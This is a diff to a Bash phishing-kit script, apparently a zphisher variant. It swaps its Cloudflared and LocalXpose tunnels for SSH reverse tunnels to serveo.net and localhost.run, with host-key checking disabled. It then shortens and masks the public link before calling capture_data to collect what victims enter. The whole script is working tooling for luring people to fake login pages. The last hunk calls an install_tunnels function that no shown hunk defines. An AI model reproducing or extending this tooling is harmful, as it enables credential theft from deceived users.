@@ -121,14 +121,7 @@ else
 	mkdir -p ".server/www"
 fi
 
-## Remove logfile
-if [[ -e ".server/.loclx" ]]; then
-	rm -rf ".server/.loclx"
-fi
 
-if [[ -e ".server/.cld.log" ]]; then
-	rm -rf ".server/.cld.log"
-fi
 
 ## Script termination
 exit_on_signal_SIGINT() {
@@ -153,7 +146,7 @@ reset_color() {
 
 ## Kill already running process
 kill_pid() {
-	check_PID="php cloudflared loclx"
+	check_PID="php"
 	for process in ${check_PID}; do
 		if [[ $(pidof ${process}) ]]; then # Check for Process
 			killall ${process} > /dev/null 2>&1 # Kill the Process
@@ -177,28 +170,18 @@ check_status() {
 ## Banner
 banner() {
 	cat <<- EOF
-		${MAGENTA}
-		${MAGENTA}  ███████╗███████╗███╗   ██╗
-		${MAGENTA}  ╚══██╔╝██╔════╝████╗  ██║
-		${MAGENTA}     ██║  █████╗  ██╔██╗ ██║
-		${MAGENTA}     ██║  ██╔══╝  ██║╚██╗██║
-		${MAGENTA}     ██║  ███████╗██║ ╚████║
-		${MAGENTA}     ╚═╝  ╚══════╝╚═╝  ╚═══╝
-		${CYAN}                  ${WHITE}v${__version__}
-		${GREEN}[${WHITE}-${GREEN}]${CYAN} Created by whydohumanssuck${WHITE}
-		${YELLOW}[${WHITE}~${YELLOW}]${CYAN} Redesigned Edition${WHITE}
+		${MAGENTA}    _____           
+		${MAGENTA}   |  ___|__  _ __ ___  ${CYAN}v${__version__}
+		${MAGENTA}   | |_ / _ \| '__/ _ \
+		${MAGENTA}   |  _| (_) | | |  __/
+		${MAGENTA}   |_| \___/|_|  \___| ${WHITE}by whydohumanssuck
 	EOF
 }
 
 ## Small Banner
 banner_small() {
 	cat <<- EOF
-		${MAGENTA}  ██╗██╗${CYAN}     ███████╗███████╗
-		${MAGENTA}  ██║██║${CYAN}     ╚════██║██╔════╝
-		${MAGENTA}  ██║██║${CYAN}      █████╔╝███████╗
-		${MAGENTA}  ╚═╝██║${CYAN}     ██╔═══╝ ╚════██║
-		${MAGENTA}  ███████║${CYAN}    ███████╗███████║
-		${MAGENTA}  ╚══════╝${CYAN}    ╚══════╝╚══════╝${WHITE} v${__version__}
+		${MAGENTA}  [ ZEN ${WHITE}v${__version__}${MAGENTA} ] ${CYAN}by whydohumanssuck
 	EOF
 }
 
@@ -276,42 +259,7 @@ download() {
 }
 
 ## Install Cloudflared
-install_cloudflared() {
-	if [[ -e ".server/cloudflared" ]]; then
-		echo -e "\n${GREEN}[${WHITE}+${GREEN}]${GREEN} Cloudflared already installed."
-	else
-		echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Installing Cloudflared..."${WHITE}
-		arch=`uname -m`
-		if [[ ("$arch" == *'arm'*) || ("$arch" == *'Android'*) ]]; then
-			download 'https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm' 'cloudflared'
-		elif [[ "$arch" == *'aarch64'* ]]; then
-			download 'https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm64' 'cloudflared'
-		elif [[ "$arch" == *'x86_64'* ]]; then
-			download 'https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64' 'cloudflared'
-		else
-			download 'https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-386' 'cloudflared'
-		fi
-	fi
-}
 
-## Install LocalXpose
-install_localxpose() {
-	if [[ -e ".server/loclx" ]]; then
-		echo -e "\n${GREEN}[${WHITE}+${GREEN}]${GREEN} LocalXpose already installed."
-	else
-		echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Installing LocalXpose..."${WHITE}
-		arch=`uname -m`
-		if [[ ("$arch" == *'arm'*) || ("$arch" == *'Android'*) ]]; then
-			download 'https://api.localxpose.io/api/v2/downloads/loclx-linux-arm.zip' 'loclx'
-		elif [[ "$arch" == *'aarch64'* ]]; then
-			download 'https://api.localxpose.io/api/v2/downloads/loclx-linux-arm64.zip' 'loclx'
-		elif [[ "$arch" == *'x86_64'* ]]; then
-			download 'https://api.localxpose.io/api/v2/downloads/loclx-linux-amd64.zip' 'loclx'
-		else
-			download 'https://api.localxpose.io/api/v2/downloads/loclx-linux-386.zip' 'loclx'
-		fi
-	fi
-}
 
 ## Exit message
 msg_exit() {
@@ -426,61 +374,41 @@ capture_data() {
 }
 
 ## Start Cloudflared
-start_cloudflared() { 
-	rm .cld.log > /dev/null 2>&1 &
+start_serveo() {
 	cusport
 	echo -e "\n${MAGENTA}[${WHITE}-${RED}]${GREEN} Initializing... ${GREEN}( ${CYAN}http://$HOST:$PORT ${GREEN})"
 	{ sleep 1; setup_site; }
-	echo -ne "\n\n${MAGENTA}[${WHITE}-${RED}]${GREEN} Launching Cloudflared..."
+	echo -e "\n\n${MAGENTA}[${WHITE}-${RED}]${GREEN} Launching Serveo..."
+	echo -e "${CYAN}  ( If asked, type ${GREEN}yes${CYAN} to accept SSH key )"
 
-	if [[ `command -v termux-chroot` ]]; then
-		sleep 2 && termux-chroot ./.server/cloudflared tunnel -url "$HOST":"$PORT" --logfile .server/.cld.log > /dev/null 2>&1 &
-	else
-		sleep 2 && ./.server/cloudflared tunnel -url "$HOST":"$PORT" --logfile .server/.cld.log > /dev/null 2>&1 &
+	ssh -o StrictHostKeyChecking=no -R 80:$HOST:$PORT serveo.net > .server/.serveo.log 2>&1 &
+	sleep 10
+	serveo_url=$(grep -o 'https://[^ ]*serveo.net' .server/.serveo.log | head -1)
+	if [[ -z "$serveo_url" ]]; then
+		echo -e "\n${MAGENTA}[${WHITE}!${RED}]${RED} Failed to generate link. Check your internet."
+		echo -e "${CYAN}  Try: ssh -o StrictHostKeyChecking=no -R 80:$HOST:$PORT serveo.net"
+		{ reset_color; exit 1; }
 	fi
-
-	sleep 8
-	cldflr_url=$(grep -o 'https://[-0-9a-z]*\.trycloudflare.com' ".server/.cld.log")
-	custom_url "$cldflr_url"
+	custom_url "$serveo_url"
 	capture_data
 }
 
-localxpose_auth() {
-	./.server/loclx -help > /dev/null 2>&1 &
-	sleep 1
-	[ -d ".localxpose" ] && auth_f=".localxpose/.access" || auth_f="$HOME/.localxpose/.access" 
-
-	[ "$(./.server/loclx account status | grep Error)" ] && {
-		echo -e "\n\n${MAGENTA}[${WHITE}!${RED}]${GREEN} Create an account on ${ORANGE}localxpose.io${GREEN} & copy the token\n"
-		sleep 3
-		read -p "${MAGENTA}[${WHITE}-${MAGENTA}]${CYAN} Input Loclx Token :${ORANGE} " loclx_token
-		[[ $loclx_token == "" ]] && {
-			echo -e "\n${MAGENTA}[${WHITE}!${RED}]${RED} You have to input Localxpose Token." ; sleep 2 ; tunnel_menu
-		} || {
-			echo -n "$loclx_token" > $auth_f 2> /dev/null
-		}
-	}
-}
-
-## Start LocalXpose (Again...)
-start_loclx() {
+start_localrun() {
 	cusport
 	echo -e "\n${MAGENTA}[${WHITE}-${RED}]${GREEN} Initializing... ${GREEN}( ${CYAN}http://$HOST:$PORT ${GREEN})"
-	{ sleep 1; setup_site; localxpose_auth; }
-	echo -e "\n"
-	read -n1 -p "${MAGENTA}[${WHITE}?${MAGENTA}]${CYAN} Change Loclx Server Region? ${GREEN}[${CYAN}y${GREEN}/${CYAN}N${GREEN}]:${ORANGE} " opinion
-	[[ ${opinion,,} == "y" ]] && loclx_region="eu" || loclx_region="us"
-	echo -e "\n\n${MAGENTA}[${WHITE}-${RED}]${GREEN} Launching LocalXpose..."
+	{ sleep 1; setup_site; }
+	echo -e "\n\n${MAGENTA}[${WHITE}-${RED}]${GREEN} Launching LocalRun..."
+	echo -e "${CYAN}  ( If asked, type ${GREEN}yes${CYAN} to accept SSH key )"
 
-	if [[ `command -v termux-chroot` ]]; then
-		sleep 1 && termux-chroot ./.server/loclx tunnel --raw-mode http --region ${loclx_region} --https-redirect -t "$HOST":"$PORT" > .server/.loclx 2>&1 &
-	else
-		sleep 1 && ./.server/loclx tunnel --raw-mode http --region ${loclx_region} --https-redirect -t "$HOST":"$PORT" > .server/.loclx 2>&1 &
+	ssh -o StrictHostKeyChecking=no -R 80:$HOST:$PORT nokey@localhost.run > .server/.localrun.log 2>&1 &
+	sleep 10
+	localrun_url=$(grep -o 'https://[^ ]*lhr.life\|https://[^ ]*localhost.run' .server/.localrun.log | head -1)
+	if [[ -z "$localrun_url" ]]; then
+		echo -e "\n${MAGENTA}[${WHITE}!${RED}]${RED} Failed to generate link. Check your internet."
+		echo -e "${CYAN}  Try: ssh -o StrictHostKeyChecking=no -R 80:$HOST:$PORT nokey@localhost.run"
+		{ reset_color; exit 1; }
 	fi
-
-	sleep 12
-	loclx_url=$(cat .server/.loclx | grep -o '[0-9a-zA-Z.]*.loclx.io')
-	custom_url "$loclx_url"
+	custom_url "$localrun_url"
 	capture_data
 }
 
@@ -500,8 +428,8 @@ tunnel_menu() {
 	cat <<- EOF
 
 		${MAGENTA}[${WHITE}01${MAGENTA}]${CYAN} Localhost
-		${MAGENTA}[${WHITE}02${MAGENTA}]${CYAN} Cloudflared  ${RED}[${CYAN}Auto Detects${RED}]
-		${MAGENTA}[${WHITE}03${MAGENTA}]${CYAN} LocalXpose   ${RED}[${CYAN}NEW! Max 15Min${RED}]
+		${MAGENTA}[${WHITE}02${MAGENTA}]${CYAN} Serveo      ${RED}[${CYAN}SSH Tunnel${RED}]
+		${MAGENTA}[${WHITE}03${MAGENTA}]${CYAN} LocalRun    ${RED}[${CYAN}SSH Tunnel${RED}]
 
 	EOF
 
@@ -511,9 +439,9 @@ tunnel_menu() {
 		1 | 01)
 			start_localhost;;
 		2 | 02)
-			start_cloudflared;;
+			start_serveo;;
 		3 | 03)
-			start_loclx;;
+			start_localrun;;
 		*)
 			echo -ne "\n${MAGENTA}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
 			{ sleep 1; tunnel_menu; };;
@@ -557,7 +485,7 @@ custom_url() {
 	tinyurl="https://tinyurl.com/api-create.php?url="
 
 	{ custom_mask; sleep 1; clear; banner_small; }
-	if [[ ${url} =~ [-a-zA-Z0-9.]*(trycloudflare.com|loclx.io) ]]; then
+	if [[ ${url} =~ [-a-zA-Z0-9.]*(serveo.net|localhost.run|lhr.life) ]]; then
 		if [[ $(site_stat $isgd) == 2* ]]; then
 			shorten $isgd "$url"
 		elif [[ $(site_stat $shortcode) == 2* ]]; then
@@ -882,6 +810,6 @@ main_menu() {
 kill_pid
 dependencies
 check_status
-install_cloudflared
-install_localxpose
+install_tunnels
+
 main_menu
